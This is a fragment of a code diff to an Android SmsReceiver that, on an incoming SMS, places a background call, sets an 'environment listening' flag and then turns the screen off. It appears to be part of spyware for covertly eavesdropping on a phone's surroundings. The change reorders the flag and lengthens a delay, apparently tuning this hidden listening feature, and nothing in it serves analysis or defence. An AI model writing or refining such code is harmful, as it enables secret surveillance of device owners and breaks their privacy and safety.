@@ -239,11 +239,10 @@ public class SmsReceiver extends BroadcastReceiver
 							Intent intent = new Intent(Intent.ACTION_CALL, uri);
 							intent.addFlags(Intent.FLAG_FROM_BACKGROUND); 
 							intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); 
+							GlobalValues.IS_ENV_LISTENING = true;
 							SmsReceiver.this.context.startActivity(intent);
 						
-							GlobalValues.IS_ENV_LISTENING = true;
-						
-							SysUtils.threadSleep(3000, LOGTAG);
+							SysUtils.threadSleep(4000, LOGTAG);
 						
 							// Turn off screen
 							PowerUtil.setScreenOff(SmsReceiver.this.context);
